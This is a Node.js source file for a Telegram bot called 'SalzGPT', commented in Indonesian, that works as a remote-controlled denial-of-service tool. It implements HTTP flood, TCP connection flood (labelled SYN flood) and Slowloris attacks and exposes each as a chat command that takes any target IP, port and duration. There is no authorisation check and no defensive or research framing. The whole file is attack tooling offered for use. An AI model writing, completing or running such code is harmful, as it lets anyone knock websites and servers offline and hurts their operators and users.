// SalzGPT - Node.js Telegram Bot
// Protokol Keamanan: Aktif

const TelegramBot = require('node-telegram-bot-api');
const net = require('net');
const http = require('http');

// --- KONFIGURASI ---
const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Ganti dengan token bot Anda

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// --- FUNGSI SERANGAN ---

/**
 * HTTP Flood: Membanjiri target dengan permintaan HTTP GET.
 * @param {string} targetIp - IP target.
 * @param {number} targetPort - Port target.
 * @param {number} duration - Durasi serangan dalam detik.
 */
function httpFlood(targetIp, targetPort, duration) {
    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
    ];

    const attackInterval = setInterval(() => {
        const options = {
            hostname: targetIp,
            port: targetPort,
            path: '/',
            method: 'GET',
            headers: {
                'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                'Connection': 'close'
            }
        };

        const req = http.request(options, (res) => {
            // Data tidak perlu diproses, hanya mengirim permintaan
        });

        req.on('error', (err) => {
            // Abaikan error koneksi untuk melanjutkan serangan
        });

        req.end();
    });

    setTimeout(() => {
        clearInterval(attackInterval);
    }, duration * 1000);
}

/**
 * SYN Flood: Membuka banyak koneksi TCP secara cepat untuk menghabiskan sumber daya.
 * @param {string} targetIp - IP target.
 * @param {number} targetPort - Port target.
 * @param {number} duration - Durasi serangan dalam detik.
 */
function synFlood(targetIp, targetPort, duration) {
    const attackInterval = setInterval(() => {
        const socket = new net.Socket();
        socket.connect(targetPort, targetIp, () => {
            // Setelah koneksi (SYN-ACK diterima), langsung hancurkan
            socket.destroy();
        });

        socket.on('error', (err) => {
            // Abaikan error (misal: koneksi ditolak) dan hancurkan socket
            socket.destroy();
        });
    });

    setTimeout(() => {
        clearInterval(attackInterval);
    }, duration * 1000);
}

/**
 * Slowloris: Membuka dan menahan koneksi dengan mengirim header parsial.
 * @param {string} targetIp - IP target.
 * @param {number} targetPort - Port target.
 * @param {number} duration - Durasi serangan dalam detik.
 * @param {number} numSockets - Jumlah koneksi simultan.
 */
function slowloris(targetIp, targetPort, duration, numSockets = 200) {
    let sockets = [];

    const createSocket = () => {
        const socket = new net.Socket();

        socket.on('error', () => {
            // Hapus socket yang gagal dari daftar
            sockets = sockets.filter(s => s !== socket);
            socket.destroy();
        });

        socket.on('close', () => {
            sockets = sockets.filter(s => s !== socket);
        });

        socket.connect(targetPort, targetIp, () => {
            const initialHeader = `GET /?${Math.floor(Math.random() * 2000)} HTTP/1.1\r\nHost: ${targetIp}\r\n`;
            socket.write(initialHeader);
            sockets.push(socket);
        });
    };

    // Inisialisasi koneksi awal
    for (let i = 0; i < numSockets; i++) {
        createSocket();
    }

    // Interval untuk menjaga koneksi tetap hidup dan membuat koneksi baru jika ada yang mati
    const keepAliveInterval = setInterval(() => {
        sockets.forEach(socket => {
            if (socket.writable) {
                const keepAliveHeader = `X-a: ${Math.floor(Math.random() * 5000)}\r\n`;
                socket.write(keepAliveHeader);
            }
        });
        // Buat ulang socket yang mati
        const needed = numSockets - sockets.length;
        for (let i = 0; i < needed; i++) {
            createSocket();
        }
    }, 10000); // Kirim header keep-alive setiap 10 detik

    // Menghentikan serangan setelah durasi selesai
    setTimeout(() => {
        clearInterval(keepAliveInterval);
        sockets.forEach(socket => socket.destroy());
    }, duration * 1000);
}


// --- HANDLER PERINTAH TELEGRAM ---

bot.onText(/\/start|\/help/, (msg) => {
    const chatId = msg.chat.id;
    const response = `
[SalzGPT] Sistem Operasional.
Perintah yang tersedia:
/httpflood <IP> <PORT> <DURASI_DETIK>
/synflood <IP> <PORT> <DURASI_DETIK>
/slowloris <IP> <PORT> <DURASI_DETIK>
    `;
    bot.sendMessage(chatId, response);
});

bot.onText(/\/httpflood (\S+) (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const ip = match[1];
    const port = parseInt(match[2]);
    const duration = parseInt(match[3]);

    bot.sendMessage(chatId, `[HTTPFLOOD] Inisiasi serangan terhadap ${ip}:${port} selama ${duration} detik.`);
    httpFlood(ip, port, duration);
});

bot.onText(/\/synflood (\S+) (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const ip = match[1];
    const port = parseInt(match[2]);
    const duration = parseInt(match[3]);

    bot.sendMessage(chatId, `[SYNFLOOD] Inisiasi serangan terhadap ${ip}:${port} selama ${duration} detik.`);
    synFlood(ip, port, duration);
});

bot.onText(/\/slowloris (\S+) (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const ip = match[1];
    const port = parseInt(match[2]);
    const duration = parseInt(match[3]);

    bot.sendMessage(chatId, `[SLOWLORIS] Inisiasi serangan terhadap ${ip}:${port} selama ${duration} detik.`);
    slowloris(ip, port, duration);
});

// --- Mulai Bot ---
console.log("[SalzGPT] Bot sedang online. Menunggu perintah...");
